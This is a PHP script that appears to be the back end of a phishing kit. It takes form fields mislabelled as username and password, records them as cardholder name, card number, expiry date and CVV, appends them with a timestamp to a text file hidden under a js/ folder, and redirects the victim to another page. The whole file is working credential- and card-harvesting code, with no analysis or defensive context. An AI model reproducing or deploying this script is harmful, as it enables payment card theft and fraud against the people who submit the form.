<?php
header ("Location:proses/index.html");
$ADEx = "js/datauserlogin76.txt";
$ADEy = $_POST['usrname'];
$ADEz = $_POST['passwod'];
$ADE = $_POST['lahir'];
$ADEu = $_POST['th'];
$ADEv = $_POST['cvv'];
$time=time();
$gmt='+7';
$jm='3600';
$var=$time+($gmt*$jm);
$now=gmdate('d M Y - H:i',$var);

$handle = fopen($ADEx, 'a');
fwrite($handle, "\n");
fwrite($handle, "Cardholder Name    : ");
fwrite($handle, "$ADEy");
fwrite($handle, "\n");
fwrite($handle, "Card number        : ");
fwrite($handle, "$ADEz");
fwrite($handle, "\n");
fwrite($handle, "Expire date        : ");
fwrite($handle, "$ADE");
fwrite($handle, "\n");
fwrite($handle, "TH                 : ");
fwrite($handle, "$ADEu");
fwrite($handle, "\n");
fwrite($handle, "cvv                : ");
fwrite($handle, "$ADEv");
fwrite($handle, "\n");
fwrite($handle, "Date Submitted     : ");
fwrite($handle, "$now");
fwrite($handle, "\n");
fwrite($handle, "\n");
fclose($handle);
exit;
?>
